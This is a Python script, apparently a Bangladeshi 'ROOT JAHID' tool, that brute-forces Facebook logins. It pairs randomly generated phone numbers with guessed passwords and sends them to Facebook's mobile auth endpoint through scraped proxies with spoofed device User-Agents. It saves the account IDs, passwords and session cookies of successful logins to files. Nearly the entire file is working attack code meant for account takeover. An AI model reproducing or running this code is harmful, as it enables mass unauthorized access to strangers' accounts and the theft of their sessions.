# DEC BY AKASH DAS 
# FB AKASH Das





import os
import time
import random
import string
import re
import sys
import requests
import json
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# A large tuple of Samsung device models and build identifiers.
# This is used for generating realistic User-Agent strings.
gtxx = (
    'GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 
    'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 
    'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 
    'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 
    'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 
    'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 
    'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 
    'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 
    'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 
    'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 
    'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 
    'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 
    'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 
    'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 
    'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 
    'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 
    'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 
    'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 
    'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'AKASH DAS', 'GT-N7102', 
    'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 
    'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 
    'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 
    'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 
    'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 
    'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 
    'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 
    'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 
    'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 
    'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820'
)
gt = gtxx
try:
    os.system('')
except:
    pass

try:
    proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('socksku.txt', 'w') as f:
        f.write(proxylist)
except Exception as e:
    pass

try:
    proxsi = open('socksku.txt', 'r').read().splitlines()
except:
    pass

# --- Global Variables ---
ok = []
cp = []
twf = []
lop = 0
xode = []
plist = []
cpx = []
cokix = []
apkx = []
paswtrh = []
rcd = []
rcdx = []
version = '1.07'
dt = '•'
dateti = str(datetime.now()).split(" ")[0]

# --- Functions and Classes ---

def ss():
    version = random.choice(['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice(['SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F'])
    build = random.choice(['MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')


class t:
    def __init__(self, z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.05)

def line():
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def logo():
    os.system('clear')
    line()

def Main():
    logo()
    print('\x1b[1;32m\n        \n     ██  █████  ██   ██ ██ ██████  \n     ██ ██   ██ ██   ██ ██ ██   ██ \n     ██ ███████ ███████ ██ ██   ██ \n██   ██ ██   ██ ██   ██ ██ ██   ██ \n █████  ██   ██ ██   ██ ██ ██████  \n                                   \n    𓆩【👑 ROOT JAHID 🧬】𓆪      \n\x1b[0m')
    print('[1] RANDOM')
    print('[0] EXIT')
    line()
    ghx = input('CHOOSE : ')
    if ghx in ('1',):
        rcd.append('1')
        rmenu1()
    elif ghx in ('0',):
        rcd.append('0')
        rmenu1()
    else:
        line()
        print('\n \tCHOOSE VALID OPTION')
        time.sleep(1)
        Main()

def rmenu1():
    global lop
    logo()
    if '1' in rcd:
        print('BD SIM CODE : 013 014 015 016 017 018 019')
        line()
    elif '0' in rcd:
        exit()
    
    code = input('CHOOSE : ')
    print('EXAMPLE : 1000 5000 10000 15000 20000')
    line()
    limit = int(input('LIMIT : '))
    print('DO YOU WENT SHOW CP ACCOUNT (y/n)')
    line()
    cx = input('CHOOSE : ')
    if cx in ('n', 'N', 'no', 'NO', '2'):
        cpx.append('n')
    else:
        cpx.append('y')
    
    print('DO YOU WENT SHOW COOKIE (y/n)')
    line()
    ckiv = input('CHOOSE : ')
    if ckiv in ('n', 'N', 'no', 'NO', '2'):
        cokix.append('n')
    else:
        cokix.append('y')
    
    for _ in range(limit):
        if '1' in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(8))
            xode.append(numberx)
        elif '2' in rcd:
            numberx = ''.join(random.choice(string.digits) for _ in range(7))
            xode.append(numberx)
    
    with ThreadPoolExecutor(max_workers=60) as tonxoys:
        tid = str(len(xode))
        logo()
        print('YOUR TOTAL ID : ' + tid)
        print('YOUR SIM CODE : ' + code)
        line()
        
        for rngx in xode:
            id = code + rngx
            psd = []
            if '1' in rcd:
                psd = [id, rngx, id[:6], id[:7], id[:8], id[5:]]
            elif '2' in rcd:
                 psd = [
                    id, rngx, id[:6], id[:7], id[:8], id[:9], 'Bangladesh', '@1234@', '@12345@',
                    '@#@#@#', '@#123456@#', '@@@###', 'aabbcc', 'aaabbb', '১২৩৪৫৬', '১২৩৪৫৬৭৮',
                    '123456', '1234567', '708090', 'mehedi', 'mababa', 'sadiya', 'jannat12',
                    'sabbir123', '@123456@', '&&&&&&', '112233', '444777', 'sadiya@12', 'sagor12',
                    'sakib12', 'sakib@12', 'sakib1', 'sakib@#', 'sakib123', 'sakib21', 'sabbir12',
                    'sabbir@#', 'sabbir1', 'sabbir123', 'sabbir#', 'sabbir1234', 'mamun12', 'siam123',
                    'sadik123', 'evan12', 'evan123', 'siddik', 'siddik123', 'masum12', 'masum123',
                    'masum1122', 'masud12', 'masud1', 'masud123', 'sojib12', 'sojib123', 'sojib11',
                    'pranto12', 'pranto123', 'pranto1122', 'antor@@##', 'antorkhan', 'antor123',
                    'Bangla', 'bangla', 'I LOVE YOU', 'i love you', '@@@###', '@#@#@#', '###@@@',
                    '১২৩৪৫৬৭৮', 'sadiya', 'sumaiya', 'jannatul', '00998877', '113355', 'mababa',
                    '১২৩৪৫৬৭', 'sabbir', 'aabbcc', 'abbuammu', 'sumiya', '১২৩৪৫৬৭৮৯'
                ]
            tonxoys.submit(graphrm, id, psd, tid)
            
def graphrm(id, psd, tid):
    global lop, ok, cp
    sys.stdout.write(f'\r\r[{lop}] [{tid}]')
    sys.stdout.flush()

    for psw in psd:
        try:
            datax = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': id,
                'password': psw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate'
            }
            header = {
                'User-Agent': ss(),
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
            
            if 'session_key' in lo:
                cki = lo.get('session_cookies')
                coki = ';'.join(f"{key['name']}={key['value']}" for key in cki)
                iid = re.findall('c_user=(.*?);xs', coki)[0]
                
                print(f'\r\r[ROOT JAHID🧬OK] {iid} | {psw}')
                ok.append(id)
                with open('/sdcard/ROOTJAHID🧬OK.txt', 'a') as f:
                    f.write(f'{iid} | {psw} | {id}  ------------>>>{coki}\n')
                
                if 'y' in cokix:
                    print(f'\r\r[ROOT JAHID🍪COOKIES] {coki}')
                    line()
                break 

            elif 'Login approvals are on' in str(lo):
                iid = lo.get('error', {}).get('error_data', {}).get('uid')
                print(f'\r\r[ROOT JAHID🧬2F] {iid} | {psw}')
                line()
                with open('/sdcard/ROOTJAHID🧬2F.txt', 'a') as f:
                    f.write(f'{iid} | {psw} | {id}\n')
                twf.append(id)
                break
                
            elif 'www.facebook.com' in lo.get('error', {}).get('message', ''):
                try:
                    iid = lo['error']['error_data']['uid']
                except:
                    iid = id
                    
                if iid not in ok and 'y' in cpx:
                    print(f'\r\r[ROOT JAHID🧬CP] {iid} | {psw}')
                    line()
                    cp.append(id)
                    with open('/sdcard/ROOTJAHID🧬CP.txt', 'a') as f:
                        f.write(f'{iid} | {psw} | {id}\n')
                break

        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
            pass

    lop += 1

if __name__ == '__main__':
    Main()